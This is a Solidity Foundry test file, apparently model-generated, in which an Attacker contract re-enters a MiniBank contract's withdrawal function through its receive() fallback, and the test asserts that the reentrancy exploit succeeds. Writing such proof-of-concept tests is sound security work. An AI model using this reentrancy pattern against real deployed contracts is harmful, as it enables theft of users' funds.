// Generation Time: 18,03s
// Input Tokens: 2520
// Output Tokens: 452
// Reasoning Tokens: 2211


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MiniBank} from "../src/MiniBank.sol";

contract TestReentrancyMiniBank is Test {
    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max);

        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    MiniBank public victim;
    uint256 public reentrancyCount;
    bool public exploitSucceeded;
    uint256 public storedVal;

    constructor(address victimAddress) {
        victim = MiniBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        storedVal = val;

        require(val > 0, "val must be > 0");
        require(address(this).balance >= val, "insufficient balance for deposit");

        victim.receiveCurrency{value: val}();
    }

    function attack(uint256 val) public {
        storedVal = val;
        victim.sendCurrency();
        exploitSucceeded = reentrancyCount > 1;
    }

    receive() external payable {
        reentrancyCount++;
        if (reentrancyCount < 2) {
            victim.sendCurrency();
        }
    }
}
